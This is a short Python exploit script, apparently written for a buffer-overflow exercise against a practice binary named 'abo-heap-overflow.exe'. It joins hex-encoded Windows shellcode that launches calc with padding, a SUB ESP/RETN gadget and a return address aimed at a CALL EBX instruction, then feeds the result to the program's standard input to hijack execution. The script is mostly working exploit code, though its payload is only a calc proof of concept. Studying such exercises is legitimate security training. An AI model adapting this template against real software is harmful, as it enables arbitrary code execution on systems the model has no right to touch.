import sys
import binascii
from subprocess import Popen, PIPE

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

shellc =  winexec_calc_shellcode +  b"A" * (168-len(winexec_calc_shellcode)) 
shellc += b"\x83\xEC\x04\xC3"        # SUB ESP,4 / RETN
shellc += b"B" * 4
shellc += b"\x30\x68\x40\x00"        # Ptro a CALL EBX
                                             
payload = shellc

p1 = Popen("abo-heap-overflow.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")


p1.communicate(payload)
p1.wait()
input()


